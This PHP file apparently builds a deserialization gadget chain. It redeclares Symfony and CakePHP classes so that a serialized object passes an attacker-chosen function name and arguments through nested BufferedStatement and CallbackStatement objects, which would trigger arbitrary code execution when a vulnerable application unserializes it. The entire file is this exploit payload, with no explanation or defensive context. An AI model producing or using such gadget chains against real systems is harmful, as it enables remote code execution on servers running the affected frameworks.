<?php

namespace Symfony\Component\Process\Pipes
{   
    class UnixPipes
    {
        public $pipes;

        public function __construct($func, $args)
        {
            $this->pipes = new \Cake\Database\Statement\BufferedStatement($func, $args);
        }
    }
}

namespace Cake\Database\Statement
{
    class CallbackStatement
    {
        protected $_callback;
        protected $_statement;

        public function __construct($func, $args)
        {
            $this->_callback = $func;
            $this->_statement = new \Symfony\Component\Console\Output\BufferedOutput($args);
        }
    }

    class BufferedStatement
    {
        protected $_allFetched=false;
        protected $statement;

        public function __construct($func, $args)
        {
            $this->statement = new CallbackStatement($func, $args);
        }
    }
}

namespace Symfony\Component\Console\Output
{
    class BufferedOutput
    {
        private $buffer;

        public function __construct($args)
        {
            $this->buffer = $args;
        }
    }
}